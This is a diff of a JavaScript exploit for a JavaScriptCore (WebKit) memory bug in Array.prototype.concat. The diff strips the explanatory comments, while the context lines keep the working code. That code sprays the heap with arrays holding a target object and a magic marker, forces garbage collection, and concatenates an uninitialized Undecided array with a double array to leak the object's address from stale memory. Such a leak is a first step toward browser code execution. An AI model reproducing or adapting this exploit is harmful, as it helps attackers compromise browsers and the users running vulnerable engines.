@@ -50,30 +50,18 @@ function hex(x) {
 
 const __len = 0x40;
 
-// an object to leak
+
 var x = {};
 
-// trigger the garbage collection so all unmarked 
-// memory blocks become free and do not interfere
-// with our further memory arrangements
+
 _gc();
 
 const MAGIC=0xB00B5;
 
-// Spam blocks containing pointer to an object we want to 
-// leak. For convenience, we allocate it the same way as the arrays used to trigger
-// the bug, so the blocks are in the same freelist. 
-// Choose __len so the freelist for that size is not heavily used,
-// to increase the success rate.
 for (var i=0; i<0x1000; i++) {
 	var b = new Array(__len).concat(new Array(__len));
 	b[0] = x;
-	// Set second element to 0x0001000000000000 + MAGIC.
-	// First convert it to double represented by MAGIC.
-	// When stored, it's going to get boxed, so we get exactly 
-	// 0x0001000000000000 + MAGIC
-	// We are going to use 0x0001000000000000 + MAGIC 
-	// to detect a spammed block later on.
+
 	b[1] = i2d(MAGIC);
 }
 
@@ -84,29 +72,10 @@ _gc();
 var a;
 for (var i=0; i<0x100; i++) {
 
-	// Use Array.prototype.concat to allocate 
-	// an Undecided array with uninitialized butterfly 
-	// using JSArray::tryCreateUninitializedRestricted via 
-	// arrayProtoPrivateFuncConcatMemcpy. For details refer to concat 
-	// implementation in JavaScriptCore/builtins/ArrayPrototype.js.
+
 	a = new Array(__len).concat(new Array(__len));
 
-	// Call arrayProtoPrivateFuncConcatMemcpy with 
-	// Undecided and DoubleArray arrays,
-	// so the result is a DoubleArray containing our spammed 
-	// values as unboxed doubles coupled with unboxed 1.1
 
-	// Here is the buggy code we are attacking 
-	//  ...
-	//  if (type == ArrayWithDouble) {
-        //       double* buffer = result->butterfly()->contiguousDouble().data();
-        //	 memcpy(buffer, firstButterfly->contiguousDouble().data(), sizeof(JSValue) * firstArraySize);
-        //	 memcpy(buffer + firstArraySize, secondButterfly->contiguousDouble().data(), sizeof(JSValue) * secondArraySize);
-    	//  } else if (type != ArrayWithUndecided) {
-	//  ...
-	//  buffer is the resulting array butterfly.
-	//  firstButterfly is pointing to our uninitialized butterfly from Undecided array
-	//  secondButterfly points to butterfly of [1.1] array
 	a = a.concat([1.1]);
 
 	// check the magic value
